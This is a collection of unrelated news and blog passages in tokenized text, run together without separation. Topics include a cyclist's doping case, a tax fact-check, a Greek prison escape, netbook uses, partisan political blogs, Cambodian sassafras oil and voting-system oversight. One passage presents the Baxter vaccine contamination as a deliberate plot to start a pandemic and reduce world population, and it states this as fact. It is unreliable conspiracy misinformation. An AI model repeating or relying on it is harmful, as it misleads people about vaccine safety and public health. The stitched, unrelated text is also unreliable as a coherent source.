It is a very difficult thing . "
Hamilton has already served a two - year suspension following a positive test for a homologous blood transfusion in 2004 .
A second offense could earn him anywhere between eight years to a lifetime ban according to the World Anti-doping Agency 's code .
For the 38 - year - old Hamilton , a comeback from any sanction would be highly unlikely .
" I woke up knowing that I 'd be talking to a few people to make it official , and it really hit home and I am really sad .
All careers have to come to an end .
I did n't want it to end like this , but life throws curve balls and I am trying to see the reason why this is happening .
A lot of people have depression and they need to get treated for it . "
Rumors of the positive test began surfacing late last month , but the Olympic gold medallist kept the news quiet .
He was due to start the Vuelta a Castilla y León last month , but withdrew citing " bronchitis " .
" No one officially knew about it , " Hamilton told Cyclingnews .
" I took a few weeks to figure out my options .
I knew it was the calm before the storm .
I needed that time to spend with my family , talk to them about what was going to happen and what I am going through . "
Supplement taken for depression , not performance enhancement Hamilton said he purchased Mitamins Advanced Formula for Depression , an over - the - counter homeopathic anti-depressant supplement that contained DHEA .
" I 'm not naive , " said Hamilton , who said he was fully aware that DHEA was an ingredient of the supplement and also one of USADA 's banned substances .
" I know people will be angry with me and depression is something I need to take care of .
I did n't do it at the right time or in the right way , and I 'm sorry for the negative spotlight , " said Hamilton , who has been a member of USADA 's out of competition anti-doping control program since 2000 .
" What I did was wrong and yes , I did know it [ DHEA ] was on the list of banned substances .
I also knew that USADA could have shown up any day and at any time to test me .
But , I was going through a very rough moment and I was desperate .
I heard about it and I thought I would try it out as an act of desperation , " said Hamilton , but he denied he took the supplement for performance enhancement .
" Did I take it for a banned substance ?
Absolutely not . "
Dr. Charles Welch , at Mass General hospital in Boston diagnosed Hamilton with clinical depression in 2003 .
He was prescribed Celexa as an anti-depressant for the next six years .
According to Hamilton , he took amounts double the prescribed dosage for two weeks in January when his mental health declined further after his mother was diagnosed with cancer .
Severe side effects caused him to stop taking the prescribed medication at the end of January .
According to Hamilton , his mental health continued to decline without prescription medication during training camp where he purchased Mitamins Advanced Formula for Depression .
Hamilton claims he took the suggested dosage for two days prior to the out - of - competition urine test .
USADA 's legal limit of DHEA found in the urine is 100ng / mL .
Hamilton 's urine sample was tested at UCLA where lab technicians found 130 ng / mL of DHEA in his urine sample .
Dr. Paul Scott , founder of Scott Analytics , reviewed the testing procedure for the B sample .
According to Scott , the level found in Hamilton 's urine was not consistent with him taking large amounts of the drug .
However , trying to nail down how much was taken is hard if not impossible .
" It could have been a large amount taken several days before the test where only small amounts remained , or it could have been a small amount , the suggested dosage on the bottle , taken the day before the control , " Scott told Cyclingnews .
" That is a question only Tyler can answer .
But , we can't exclude other possibilities to the way it was taken . "
DHEA is a natural hormone released by the adrenal glands and the synthetic form is primarily marketed as an anti-aging drug , an anti-depressant and for muscle growth .
It is one of the only steroids in the USA not classified as a controlled drug and does not need FDA approval to be sold over the counter .
According to Scott , it is banned by the World Anti Doping Agency ( WADA ) and USADA because it is an andro-related substance .
Technically , however , DHEA has very little performance - enhancing effects on the body .
" There is no scientific evidence or basis for this steroid to be a performance enhancer , " said Scott .
" It is fair to suggest that the probability of DHEA having a performance effect on anyone , at any amount taken is inconceivable .
There is no good reason to take DHEA , this is a very foolish drug to take because it is readily detectable , but it has no performance enhancements . "
Hamilton 's past transgressions
While an athlete with a clean history might escape sanction or get a reduced suspension based on lack of intent to enhance performance , Hamilton 's past doping conviction will likely prevent him from earning leniency in this case .
In 2004 , Hamilton returned positive A samples in both the Olympic time trial and the subsequent Vuelta a España , although he was allowed to keep that TT gold medal as the B sample had been incorrectly stored and was unable to be analysed .
However his samples from his stage eight time trial win in the Vuelta on September 11th were tested and confirmed the presence of blood cells from an unspecified donor .
His Phonak team - mate Santiago Perez also tested positive for a homologous blood transfusion .
The only other cases of homologous blood transfusions in cycling also involved a pair of teammates ; Astana 's Alexander Vinokourov and Andrey Kashechkin were suspended in 2007 .
Hamilton insisted upon his innocence and fought the suspension , funded partly by donations from fans ,
He was given a two - year suspension by the United States Anti-Doping Agency on April 18 , 2005 .
Exactly one month later he appealed to the Court of Arbitration for Sport but this was dismissed .
That suspension ended in September 2006 and he signed with Tinkoff Credit Systems .
He was soon in hot water again when he was linked to the Operaci�n Puerto scandal ; on June 26 , 2006 , the Madrid daily El Pa�s alleged that the Spanish civil guard had found evidence that Hamilton had paid over 50,000 USD to Dr. Eufemiano Fuentes for doping products , namely EPO , growth hormones , blood doping and masking agents .
Investigators also released details of a fax sent by Fuentes to his wife Haven , using her maiden name Haven Parchinski , listing fees due to the doctor .
Hamilton continued to deny all wrongdoing , but following the release of more information at the end of April 2007 he was suspended soon afterwards by his team .
He considered retirement , then eventually returned to competition in 2008 with Rock Racing .
Although he and other Operaci�n Puerto - linked riders were blocked from riding the Tour of California in 2008 , he won the 2.HC Tour of Qinghai Lake in China last July and then took the US National road race championships in August .
This season , Hamilton has competed in both the Tour of California and the Vuelta Mexico Telmex .
He was only 95th overall in California but took second in the mountains classification .
He was then 45th in Mexico and fifth on stage seven ; Rock Racing won the team classification in the 2.2 race .

In defending President Obama 's plan to reduce tax deductions for high earners , the White House has said the tax code is tilted toward rich guys .
They 've understated the case considerably .
We 'll explain how in a bit .
First , some background :
The issue arose when Obama proposed reducing the percentage of charitable contributions that taxpayers who earn more than $ 250,000 can take as a tax deduction , from 35 to 28 percent .
That would raise about $ 318 billion toward Obama 's proposed $ 634 billion " reserve fund " to be used to reform health care , according to Obama 's budget proposal .
Critics , including some Republicans and nonprofit executives , do n't like the idea .
At a White House news briefing , Jake Tapper of ABC News said the proposal was controversial and asked White House spokesman Robert Gibbs , " Are you willing to consider a different revenue stream than that tax increase to fund health care ? "
" Well , I do think all issues are on the table , " Gibbs replied .
" Let 's , though , just discuss the — I assume you 're talking about the charitable contribution — I mean , a middle - class family donates a dollar to charity , they get 15 cents off their income tax .
Bill Gates donates a dollar to charity , he takes 35 cents off his income tax .
The proposal that the White House has would simply reduce those levels to the same levels that we saw during the Reagan administration . "
Budget director Peter Orszag made the same argument in this blog post .
Let 's walk through how charitable deductions impact taxes .
If you donate $ 1 to charity , you can list that as a deduction , meaning you can subtract $ 1 from your income before calculating your taxes .
High earners like Bill Gates pay a tax rate of 35 percent on the portion of their income that is over about $ 350,000 .
So if they subtract $ 1 from their taxable income , their tax burden drops by 35 percent of $ 1 , which is 35 cents .
By contrast , couples with taxable income between $ 16,700 and $ 67,900 pay a top tax rate of 15 percent .
If they make that same $ 1 contribution , and subtract the $ 1 from their income , their tax burden falls by just 15 percent of $ 1 , or 15 cents .
Gibbs ' point rests on the contention that couples making between $ 16,700 and $ 67,900 are middle class , which we believe is fair — the median household income in the U.S. is $ 50,233 .
So Gibbs was right , except that he understated the case .
Here 's how :
First , you can't take any deduction for a charitable contribution unless you itemize your taxes .
Folks in the 15 percent tax bracket are unlikely to do so , while rich folks are very likely to .
Only 35 percent of all taxpayers itemized their taxes in 2004 , but 87 percent of taxpayers in the top 10 percent were itemizers , according to the Urban Institute .
We 're not going to penalize Gibbs for understating his case , because his numbers hold true when comparing two taxpayers who itemize , and he confined his comment to the income tax .
It 's worth noting that the rich only enjoy bigger deductions because they pay more taxes — a top tax rate of 35 percent instead of 15 percent , and an estate tax on top of that .
But it 's also true that a charitable contribution of , say , $ 1,000 will take a much bigger bite out of a middle - class person 's income than a high earner's .
That 's all academic though .
The bottom line is that Gibbs ' number are accurate .
We find this claim to be True .

Advertisement A massive manhunt is under way in Greece after two criminals escaped from a top security prison by helicopter - for the second time in three years .
Serial armed robber and kidnapper Vassilis Paleokostas , and his Albanian sidekick , Alket Rizai , were days away from trial for their 2006 escape .
They fled Korydallos prison on Sunday after a helicopter landed on the roof and a rope ladder was thrown to them .
Three top prison service officials have been dismissed by the justice minister .
Nikos Dendias said he had sacked the general secretary of the justice ministry , the inspector - general of prisons and the head of Korydallos prison after visiting the facility on Sunday evening .
" This was an insult which I will not accept ...
I will take measures as harsh as necessary , " he told reporters afterwards .
Police also arrested three prison guards and the helicopter pilot on Monday , according to the Associated Press , while Prime Minister Costas Karamanlis has called a meeting to discuss the escape .
Shots fired
The escape happened at about 1530 local time ( 1330 GMT ) on Sunday , the Associated Press news agency reported .
The helicopter was found by a highway in a northern Athens suburb Guards on the ground opened fire but a woman on board the helicopter shot back with an assault rifle .
No injuries were reported .
The helicopter was then found by a highway in the northern Athens suburb of Kapandriti .
The pilot had been bound and gagged , and had a hood over his head .
He reportedly told police that the helicopter had been chartered by a couple who wanted to go from the town of Itea in central Greece to Athens , but who later threatened him with an automatic rifle and forced him to fly to the prison .
AP reported that he was later arrested , though this was not confirmed .
Police said the helicopter 's fuel tank had been hit by a bullet and was leaking .
The road on which the helicopter was found leads towards Greece 's central mountain range , an area where Paleokostas , 42 , was able to hide with impunity during previous years , says the BBC's Malcolm Brabant in Athens .
Our correspondent says the breakout is a damning indictment of Greece 's prison system .
Brother captured
Three years ago both men managed to escape when a hijacked helicopter landed in Korydallos ' central yard at exercise time .
On that occasion , the guards failed to react , because they thought it was a visit by prison inspectors .
Prime Minister Karamanlis has called a meeting to discuss the escape Paleokostas was previously in prison for a string of crimes including the kidnapping of an industrialist called George Mylonas , released after paying a substantial ransom .
After the previous escape he was recaptured in August 2008 .
The architect of that escape , Paleokostas ' brother Nikos , has since been captured and jailed , and is now likely to face increased security , our correspondent says .
Even though he was behind bars , Paleokostas is thought to have been involved in the kidnapping of a shipping magnate last year which netted the kidnappers $ 38 m .
An investigation into the previous escape at Korydallos prison recommended it be covered with netting to prevent helicopters from landing .
But the changes were never implemented , our correspondent says .

Company officials say Ms. Saenz was fired on April 29 , 2008 , after a patient spotted her injecting an unusual fluid into the intravenous tube of another person undergoing dialysis .
Image Kimberly Saenz
A month later , she was arrested on assault charges in connection with patients who had become ill after receiving infusions of bleach .
At the time , the police said at least two patients had seen her draw bleach into syringes and inject it into patients .
Traces of bleach were also found in syringes and dialysis lines , they said .
On Tuesday , the Angelina County district attorney , Clyde Herrington , convinced a grand jury that the evidence against Ms. Saenz was strong enough to charge her with murder in five deaths .
She was arrested Thursday night and was being held in the Angelina County jail without bond .
Her lawyer , John Henry Tatum , did not respond to messages left at his office in Lufkin , a town of 40,000 people about 115 miles north of Houston .
DaVita , which operates 1,400 dialysis clinics across the country , maintains there was nothing in Ms. Saenz ’s employment history to suggest she was a danger to patients .
The company has also said managers at the clinic could not have prevented the attacks .
“ This lone individual ’s alleged intentional and deceptive acts have caused incredible grief for the victims ’ family members , ” a spokesman for the company , Richard A. Grenell , said in a statement .
Netbooks are good for many things , although none of those things is “ actual work . "
For simple browsing , e-mailing and perhaps even listening to music , the little laptops are ideal .
For actual , heavy day - to - day use , they ’re still lacking .
I was reminded of this today when I took my Wind Hackintosh to the local library to work .
I was lazy and figured it would be easier to sling in my bag than the usual MacBook and , given that blogging is an online activity and my NetNewsWire account is synced across machines , I would have all my tools with me .
It quickly became clear that I was wrong .
First , there were no power sockets free , so I was running against the clock .
The three - cell battery in my Wind lasts for around one - and - a - half hours on a good day .
By the time I had replied to mail and dithered around , I was at around sixy - some percent .
After one post , I was halfway to a dead battery .
Next was the keyboard .
I have a mouse hooked up , so the terrible trackpad does n’t matter , but the keyboard is just too cramped .
My typing is always bad , but trying to tap out more than two words without a typo is impossible on this thing .
So I got to wondering , why do I have this machine ?
What else could I use it for ?
What is it actually good for ?
I came up with the following :
Photo Assistant
This was my first thought , and one I will test out this weekend on a trip to Rome ( do n’t tell the Lady — it ’s a surprise ) .
I will be taking the Wind to use as a portable backup for my photos .
It ’s perfect : A netbook is tiny , and can be thrown into carry - on luggage .
The screen is big enough for basic viewing and editing , and all netbooks have SD card readers built in .
My Wind clone has a 160 GB hard drive so there ’s plenty of space , and the addition of a tiny , bus - powered external drive will mean I have two copies of everything .
Compare this to buying extra memory cards .
I use Sandisk ’s Extreme IV CF cards in my D700 , and the 4GB ones are around € 50 ( $ 70 ) a pop .
Just five of those cost the same as a Wind , and are easier to lose .
Traveling Researcher
This one is fantastic .
I recently spent a week in Berlin with the beautiful and vivacious John Brownlee , formerly of Boing Boing Gadgets .
We hung out with another of his friends , a guy named Travis who reads stuff for a living and had a netbook tethered to his BlackBerry ’s data connection ( he also had a couple of six - cell batteries ) .
We had a typical geek week , hanging out in Wi-Fi bars with our computers , but as Travis was always connected , he ended up as a human version of the Star Trek computer .
Every single fact could be checked , and he did it .
It sounds simple but the change this makes to a conversation is incredible , if impossibly nerdy .
And that ’s before we get started on the Instant Rimshot .
Clock
Download the excellent Fliqlo screensaver ( pictured above ) and turn your netbook into a nightstand clock .
Any clock would do , of course , but this one has just the right retro-ness ( it ’s just like Marty McFly ’s clock in Back to the Future ) and is free .
OS X and Windows .
Alternatively , use your computer ’s built - in ability to display a slideshow as a screensaver and use the netbook as a $ 350 photo frame .

iTunes Streaming
The Airport Express is a great piece of kit — hook it up to a pair of speakers and you can stream music wirelessly from any computer in your bachelor pad .
But if you already have a netbook knocking around , you can save yourself the $ 100 that the Airport Express costs .
You ’ll need software .
Rogue Amoeba ’s Airfoil is an application that will stream anything to an Airport Express , not just music from iTunes ( it even does movies ) .
The $ 25 app comes with a free companion application ( which can be downloaded separately ) called Airfoil Speakers .
It runs on OS X or Windows and turns your netbook into a virtual Airport Express .
You just hook the netbook up to the speakers and stream from anywhere in the house .

Laptop Tray
I ’m not kidding .
Right now I ’m sitting on the Lady ’s bed typing this , using my MacBook ( the battery on the Wind died at the library after two posts ) .
My lap was getting a little hot so I looked around for something flat to tuck underneath and protect the family jewels .
The little netbook came to the rescue and is now adding an inch or so to the gap between lap and laptop .
Your turn now , readers .
To what other uses can a netbook be pressed ?
Suggestions in the comments .
Ahh , so we are back to putting Obama in " scary " pictures with sad music to convince us all that he 's evil ?
It 's been 63 days , and he 's already kept about 70 % of his top campaign promises according to PolitiFact.com .
Overall , out of 500 promises PolitiFact is tracking , he 's kept 20 , 44 are in the works , 3 are stalled , 3 were compromised , and 3 were broken .
And I 'd argue that Promise # 253 to allow 5 days for public comment for non-emergency bills was n't broken for the Stimulus bill , because it was necessary to get money into the economy again , and quickly .
That 's not a bad record for only 63 days .
So President Obama is right , the GOP is great at being against things , and not so great at being for things ( at least nothing that will help the country ) .
I do not think the Republicans are incapable of coming up with a good idea or two on the economy , I do think they are n't even trying to come up with a good idea or two .
A few weeks ago Rep .
Boehner stated that the GOP is n't there to legislate , they are only there to get a message out .
Even if you no longer have the votes to pass your failed policies , you do have enough members to be able to offer some valuable ideas .
And while the GOP spends its time trying to smear the Democrats and President Obama , the Dem numbers either remain largely unchanged or go up while the GOP numbers continue to fall to depths I would n't have thought possible .
President Obama continued :
" On budget issues , what you 've seen is the Republican Party trying to position themselves as fiscally conservative after eight years of being in power and not being particularly fiscally conservative , and I understand their efforts to brand themselves in that fashion , " the president said .
Advertisement " I just want to make sure that when it comes to solving this current economic crisis , that we do n't get so caught up in short - term politics that we 're missing the big picture , " Obama said .
This is not the time to play games .
President Obama has been very consistent in saying that .
I think he 's reached out with multiple olive branches to the Republicans , he 's been more than gracious in dealing with them .
But the Republicans STILL do n't get it .
People recognize what they are doing now because they saw them do it all during 2008 .
They are playing politics , and when you are worried about your job , your child 's education , your inability to afford decent health care , you do n't have time to play the political games that people want to play ( on both sides ) .
President Obama cannot fix the economy by himself .
If the GOP wants to offer ideas , I say " go for it " we need all of the ideas we can get to make sure things work out the same .
But when you bring your ideas , you have to bring them in good faith , do n't bring the same failed ideas from the past administration that got us into this mess .
Trying to blame President Obama for everything is n't working .
Average people , who do n't spend all of their time watching 24 hour news stations and reading blogs / newspapers online , only know that they see President Obama and other Democrats offering ideas , while they see Republicans whining about those ideas without offering anything themselves .
Overall , I think President Obama is a patient man , but I do n't think he suffers fools gladly , and right now the Republicans are acting downright foolishly .
Obama is presenting his ideas , he 's doing all he can to get us out of the messes the Republicans got us into .
You'd think the Republicans who managed to hold on to their seats would rather been seen as trying to work WITH the President as opposed to working against him .
Tonight , President Obama will once again talk straight to the American people , which I 'm sure will inspire more head explosions from the GOP that 's trying to claim he 's becoming " over exposed . "
Personally , I like that Obama is out in the open telling us what he 's doing and what he 's trying to do and attempting to engage all citizens indeed the entire world , it beats the hell out of the secrecy of the last eight years .
UPDATE
Looks like the Dems are going to capitalize on the GOP 's hater mentality of trying to convince us all that President Obama is doing too much :
" I guess when you have no new ideas , anything more than zero must seem overwhelming .
But , if the Republican party thinks that attacking new ideas is a winning answer , they ’re more out of touch than we all thought .
Now is a time when we could use all the good ideas we can get — and we invite the Republican party to offer some new ones rather than playing the same old Washington games .
They can start by putting out their own budget proposal . "
It 's fun being on message !
( From Harry Reid 's Spokesman ) If Republicans would have done a little planning of their own over the last eight years , perhaps we still would n’t have 138,000 troops in Iraq .
Perhaps with a little planning they would n’t have stranded countless Americans in New Orleans in the aftermath of Hurricane Katrina .
Perhaps a little planning would have helped stave off the collapse of the housing sector .
I know it must be hard for them to comprehend , but one day they ’ll come to realize that competent proactive planning is n’t such a bad thing .
Ouch !

California ’s Political Reform
Act of 1974 , and laws like it across the country , sought to cast disinfecting sunlight on the political process by requiring contributions of more than $ 100 to be made public .
Image A Web site takes names and ZIP codes of donors supporting the measure and overlays data on a map .
Eightmaps takes that data , formerly of interest mainly to social scientists , pollsters and journalists , and publishes it in a way not foreseen when the open - government laws were passed .
As a result , donors are exposed to a wide audience and , in some cases , to harassment or worse .
A college professor from the University of California , San Francisco , wrote a $ 100 check in support of Proposition 8 in August , because he said he supported civil unions for gay couples but did not want to change the traditional definition of marriage .
He has received many confrontational e-mail messages , some anonymous , since eightmaps listed his donation and employer .
One signed message blasted him for supporting the measure and was copied to a dozen of his colleagues and supervisors at the university , he said .
“ I thought what the eightmaps creators did with the information was actually sort of neat , ” the professor said , who asked that his name not be used to avoid becoming more of a target .
“ But people who use that site to send out intimidating or harassing messages cross the line . ”
Joseph Clare , a San Francisco accountant who donated $ 500 to supporters of Proposition 8 , said he had received several e-mail messages accusing him of “ donating to hate . ”
Mr. Clare said the site perverts the meaning of disclosure laws that were originally intended to expose large corporate donors who might be seeking to influence big state projects .
“ I do n’t think the law was designed to identify people for direct feedback to them from others on the other side , ” Mr. Clare said .
“ I think it ’s been misused . ”
Many civil liberties advocates , including those who disagree with his views on marriage , say he has a point .
They wonder if open - government rules intended to protect political influence of the individual voter , combined with the power of the Internet , might be having the opposite effect on citizens .
Illegal factories hidden in the Cambodian rainforest that were producing a raw ingredient for the drug ecstasy have been tracked down and destroyed by investigators from an international environmental agency , working with the Cambodian authorities .
In a month - long investigation the team from Fauna and Flora International ( FFI ) uncovered the illegal distilleries deep in the forest of the Cardamom mountains in south - west Cambodia .
The two new facilities were intended to make sassafras oil from the roots of the extremely rare Mreah Prew Phnom tree for export to neighbouring countries .
Sassafras oil is used to make cosmetics , but it can also be used as a precursor chemical to make methylenedioxymethamphetamine , more commonly known as the recreational drug ecstasy .
FFI was alarmed that the rate of the illegal production of the " ecstasy oil " could have wiped out the Mreah Prew Phnom tree within five years .
The trees are felled and the excavated roots mechanically shredded and boiled in a cauldron during a process that takes about 12 hours to produce 30 litres of oil .
Surrounding trees are also felled to fuel fires for the distillation , threatening one of the last great rainforests in south - east Asia .
Rivers are polluted by the effluent from the oil production .
The two factories were discovered last month during the investigation by FFI staff working with Cambodia 's environment ministry , which called in the army .
The factories run by Vietnamese syndicates in the Phnom Samkos Wildlife Sanctuary were destroyed and two people arrested .
Sassafras oil production is illegal in Cambodia .
Last year 33 tonnes of sassafras oil that FFI helped to seize was destroyed by the Cambodian government and the Australian police , who claimed it could have been used to produce 245 m ecstasy tablets with a street value of £ 4.82bn .
The environmental group first became involved in efforts to crack down on sassafras oil production in 2004 because of the alarming levels of deforestation .
In the Phnom Samkos sanctuary FFI now supports 49 Cambodian environment ministry rangers who have closed dozens of factories .
FFI staff estimate there were 75 sassafras oil distilleries operating in the sanctuary at the industry 's height in 2006 .
The number has plummeted , but tight monitoring is vital to prevent a fresh upsurge .
" The re-emergence of the sassafras factories in Phnom Samkos wildlife sanctuary is of enormous concern to us , " said FFI field coordinator , Tim Wood .
" Recent law enforcement operations clearly show that this threat still persists and that we must remain very vigilant in our effort to suppress this and other forest crimes .
But the policing of the illegal trade is under threat from funding cuts and FFI is calling on the Cambodian government and international donors to support the work of the rangers in combating the production .
Czech Papers Question Whether Contaminated Baxter Vaccine Was ‘ Attempt to Provoke Pandemic ’

NEWSFLASH : Alex Jones will appear on Coast to Coast AM this evening ( March 10th ) to discuss this shocking story and the horrific consequences that it entails .

Czech newspapers are questioning if the shocking discovery of vaccines contaminated with the deadly avian flu virus which were distributed to 18 countries by the American company Baxter were part of a conspiracy to provoke a pandemic .
The claim holds weight because , according to the very laboratory protocols that are routine for vaccine makers , mixing a live virus biological weapon with vaccine material by accident is virtually impossible .
“ The company that released contaminated flu virus material from a plant in Austria confirmed Friday that the experimental product contained live H5N1 avian flu viruses , ” reports the Canadian Press .
Baxter flu vaccines contaminated with H5N1 – otherwise known as the human form of avian flu , one of the most deadly biological weapons on earth with a 60 % kill rate – were received by labs in the Czech Republic , Germany , and Slovenia .
Initially , Baxter attempted to stonewall questions by invoking “ trade secrets ” and refused to reveal how the vaccines were contaminated with H5N1 .
After increased pressure they then claimed that pure H5N1 batches were sent by accident .
This was seemingly an attempt to quickly change the story and hide the fact that the accidental contamination of a vaccine with a deadly biological agent like avian flu is virtually impossible and the only way it could have happened was by wilful gross criminal negligence .
( ARTICLE CONTINUES BELOW )
According to a compiled translation from Czech newspaper stories , the media over there is asking tough questions about whether the contamination was part of a deliberate attempt to start a pandemic .
“ Was this just a criminal negligence or it was an attempt to provoke pandemia using vaccination against flu to spread the disease – as happened with the anti-B hepatitis vaccination with vaccines containing the HIV virus in US ? – and then cash for the vaccines against H5N1 which Baxter develops ?
How could on Earth a virus as H5N1 come to the ordinary flu vaccines ?
Do n’t they follow even basic precautions in the american pharma companies ? ” states the translation .
The fact that Baxter mixed the deadly H5N1 virus with a mix of H3N2 seasonal flu viruses is the smoking gun .
The H5N1 virus on its own has killed hundreds of people , but it is less airborne and more restricted in the ease with which it can spread .
However , when combined with seasonal flu viruses , which as everyone knows are super - airborne and easily spread , the effect is a potent , super - airbone , super deadly biological weapon .
As the Canadian Press article explains , “ While H5N1 does n’t easily infect people , H3N2 viruses do .
If someone exposed to a mixture of the two had been simultaneously infected with both strains , he or she could have served as an incubator for a hybrid virus able to transmit easily to and among people . ”
There can be little doubt therefore that this was a deliberate attempt to weaponize the H5N1 virus to its most potent extreme and distribute it via conventional flu vaccines to the population who would then infect others to a devastating degree as the disease went airborne .
The Canadian Press article states , “ That mixing process , called reassortment , is one of two ways pandemic viruses are created , ” but then claims that there is no evidence that this is what Baxter were doing , despite there being no clear explanation as to why Baxter has samples of the live avian flu virus on its premises in the first place .
However , to reiterate , the key aspect of this story is that it is virtually impossible for live avian flu virus to find its way into a vaccine by “ accident ” .
As health expert Mike Adams points out , “ The shocking answer is that this could n’t have been an accident .
Why ?
Because Baxter International adheres to something called BSL3 ( Biosafety Level 3 ) – a set of laboratory safety protocols that prevent the cross-contamination of materials . ”
As explained on Wikipedia ( http://en.wikipedia.org/wiki/Biosaf…):
“ Laboratory personnel have specific training in handling pathogenic and potentially lethal agents , and are supervised by competent scientists who are experienced in working with these agents .
This is considered a neutral or warm zone .
All procedures involving the manipulation of infectious materials are conducted within biological safety cabinets or other physical containment devices , or by personnel wearing appropriate personal protective clothing and equipment .
The laboratory has special engineering and design features . ”
Under the BSL3 code of conduct , it is impossible for live avian flu viruses to contaminate production vaccine materials that are shipped out to vendors around the world .
This leaves only two possibilities that explain these events : Possibility # 1 : Baxter is n’t following BSL3 safety guidelines or is so sloppy in following them that it can make monumental mistakes that threaten the safety of the entire human race .
And if that ’s the case , then why are we injecting our children with vaccines made from Baxter ’s materials ?
Possibility # 2 : A rogue employee ( or an evil plot from the top management ) is present at Baxter , whereby live avian flu viruses were intentionally placed into the vaccine materials in the hope that such materials might be injected into humans and set off a global bird flu pandemic .
Spreading bird flu would create an instantaneous surge of demand for bird flu vaccines .
The profits that vaccine companies such as Baxter International could reap out of such a panic are astronomical .
In addition , as we have previously reported , those that have a stake in the Tamiflu vaccine include top globalists and BIlderberg members like George Shultz , Lodewijk J.R. de Vink and former Secretary of Defense Donald Rumsfeld .
Authorities in both Europe and the U.S. have openly detailed plans for martial law , quarantine and internment should a bird flu pandemic occur .
The other motivation , as we have exhaustively documented on this website for years , is the fact that elites throughout history have openly stated that they want to see a world population reduction of around 80 per cent .
Shocking stories like this take the plausibility of that narrative out of the realms of conspiracy theory and into the dangerous reality of conspiracy fact .
“ Baxter is acting a whole lot like a biological terrorism organization these days , sending deadly viral samples around the world .
If you mail an envelope full of anthrax to your Senator , you get arrested as a terrorist .
So why is Baxter — which mailed samples of a far more deadly viral strain to labs around the world — getting away with saying , essentially , “ Oops ? ” , Adams concludes .
This is not the first time that vaccine companies have been caught distributing vaccines contaminated with deadly viruses .
In 2006 it was revealed that Bayer Corporation had discovered that their injection drug , which was used by hemophiliacs , was contaminated with the HIV virus .
Internal documents prove that after they positively knew that the drug was contaminated , they took it off the U.S. market only to dump it on the European , Asian and Latin American markets , knowingly exposing thousands , most of them children , to the live HIV virus .
Government officials in France went to prison for allowing the drug to be distributed .
The documents show that the FDA colluded with Bayer to cover - up the scandal and allowed the deadly drug to be distributed globally .
No Bayer executives ever faced arrest or prosecution in the United States .

Well , he says Obama was going to take his guns away , and that ’s why he needed to kill 3 police officers today .
What radio show do you think he listens to ?
What TV network do you think he watches ?
And what party do you think he votes for ?
Remember what Palin and McCain were doing to their crowds during the campaign , the way they were pushing people towards viewing Obama as a terrorist hell - bent on destroying our country ?
The way Republicans today says that we need a “ revolution ” to stop the “ socialism ” and the “ fascism ” that is Obama ?
And we ’re supposed to wonder why crazy people act out violently after being told that Obama is a terrorist , out to destroy our country , and that the only solution is to rise up in a revolution against the enemy .

" It is through the Constitution that we control the reins of government and insure that it remains the protector of individual , unalienable Rights - i.e. , the servant of the People .
" Therefore , it behooves the People to show the Government that the People know what their Rights are and what Government 's obligations are , that the People are watching Government as it exercises its delegated powers and that the People are prepared to act if the Government steps outside the boundaries drawn around its power by the Constitution . "
--- We The People Foundation
The U.S. Election Assistance Commission ( EAC ) works for the People .
It does n't work for special interests .
It does n't work for the voting system vendors .
The EAC has an obligation , spelled out in its past advisories , public statements and , most importantly , in federal law , to carry out oversight of the voting systems we , the People , use in our federal elections .
It does not matter that the EAC commissioners are not elected to their positions .
They are still servants of the People .
Not long after being created by the Help America Vote Act ( HAVA ) of 2002 , the EAC published , on June 8 , 2004 , " Chairman Soaries ' Remarks about Electronic Voting Security Strategy for the November 2004 Presidential Election . "
The comments , by then EAC Chairman DeForest " Buster " Soaries included recommendations " to insure election integrity and promote voter confidence in the administration of the 2004 federal election , " and stated , in part : " [ The ] EAC should solicit information about suspicious electronic voting system activity including software programming and should request aggressive investigative and prosecutorial responses from the U.S. Department of Justice Elections Crimes Branch in the Criminal Division . "
The above was restated in a July 13 , 2004 " Commission Advisory Letter " [ PDF ] .
It 's clear that if there is to be any federal body to recommend investigation and / or prosecution to the DoJ , in regards criminal violation of federal law concerning voting systems , it is to be the EAC , the body charged with testing , certifying , and performing as the " national clearinghouse ... with respect to the administration of federal elections " ( 42 U.S.C. § 15322 ) and the electronic voting systems employed across the country .
And yet , the EAC has continued to utterly fail in those duties , as a particularly maddening chain of inquiries and emails --- back - and - forth and round - and - round --- that we 'd sent to the EAC commissioners and their spokesperson over the past three months illustrates all too well .
All we were trying to do was get a simple answer to a very simple question ...
Last December 5th
The BRAD BLOG reported about the discovery of votes that were " lost " on the Humboldt County , CA , electronic tabulation system .
Then , three days later we reported that Diebold knew that their voting system might lose votes and , worse , had known about the flaw in their system for more than 4 years .
So who has the responsibility to do something about this ?
The EAC is not empowered to carry out criminal investigations or bring legal sanctions or prosecution .
However , as with all federal agencies , the EAC has the responsibility to ask the DoJ to investigate potential violations of federal law and , if merited , to prosecute the offenders .
That is serving the People .
On December 5 , 2008 we wrote to the EAC's then Chairwoman Rosemary Rodriguez , Executive Director Tom Wilkey , Voting Systems Head Brian Hancock , and EAC Spokeswoman Jeannie Layson , alerting them to the troubling revelations in Humbolt County --- which forced its Registrar of Voters to submit a re-certification for their November election results to the state , once " lost " votes were discovered --- and inquiring whether or not they planned to take appropriate action with a referal to the DoJ [ emphasis added ] ...

This mornings Eureka Times - Standard has a news report from Humboldt Co California where they , for the first time , used the " Humboldt Election Transparency Project " .
In this project all paper ballots are scanned after counting and then the images are placed online for anyone 's use .
The project also has software that was used , post election certification , to check the ballots .
Thanks to this project they found that the Diebold / Premier GEMS [ Global Election Management Server ] v. 1.18.19 that they were using seems to have a problem .
If it had not been for that project 197 voters would not have had their ballots counted in last month 's general election .
All of the absentee ballots from one precinct would have been ignored .
The Registrar of Voters , Carolyn Crnich , deserves a huge congratulations for allowing this project to be stood up in her county .
I know that her voters and , probably the Secretary of State , would agree with that .
What about the problem with GEMS .
Well , according to the article Diebold has known about the problem since 2004 and they appear to have neglected to tell all of their customers .
The county did n't know .
The state did n't know .
Two other California counties who also use that version claim to have known .
Does Maryland know about this ?
If so what is their mitigation ?
So , we have a vote counting problem with a voting system .
The error can not be attributed to any action by the voters .
It is clear that the 197 miscounted ballots out of a total of 64,161 ballots cast in the county will amount to a higher than allowed for error rate .
Therefore it is clear that the use of this voting system has resulted in a violation of HAVA Section 301( a ) ( 5 ) .
Will the EAC refer this violation of federal law to the Department of Justice for investigation ?
Or , will users of this particular system continue to use it and potentially lose hundreds of ballots ?
After waiting for three weeks for a response , we sent a follow - up note on December 29th to the same addressees as the prior email [ emphasis added again ] ...

This morning the Eureka Times - Standard has again posted an article about the failure of the voting system sold to Humboldt Co California by Diebold / Premier .
Commissioner Rodriguez is thoroughly quoted in this article .
